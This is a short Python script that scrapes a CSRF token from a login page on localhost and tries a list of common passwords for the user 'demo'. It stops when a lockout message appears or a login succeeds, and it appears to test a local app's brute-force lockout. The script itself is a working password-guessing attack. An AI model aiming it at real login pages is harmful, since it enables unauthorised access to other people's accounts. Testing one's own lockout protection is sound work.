import requests
from bs4 import BeautifulSoup

login_url = "http://127.0.0.1:8000/login/"
passwords = ["123456", "password", "demo", "demo123", "demopassword", "secret123"]

session = requests.Session()

get_response = session.get(login_url)
soup = BeautifulSoup(get_response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrfmiddlewaretoken"})["value"]

for password in passwords:
    response = session.post(
        login_url,
        data={
            "username": "demo",
            "password": password,
            "csrfmiddlewaretoken": csrf_token,
        },
        headers={"Referer": login_url},
    )

    print(f"Tried: {password} | status: {response.status_code}")

    if "Too many failed login attempts" in response.text:
        print("Lockout message shown")
        break

    if "Logged in as" in response.text or "Current user:" in response.text or "Logout" in response.text:
        print(f"Password found: {password}")
        break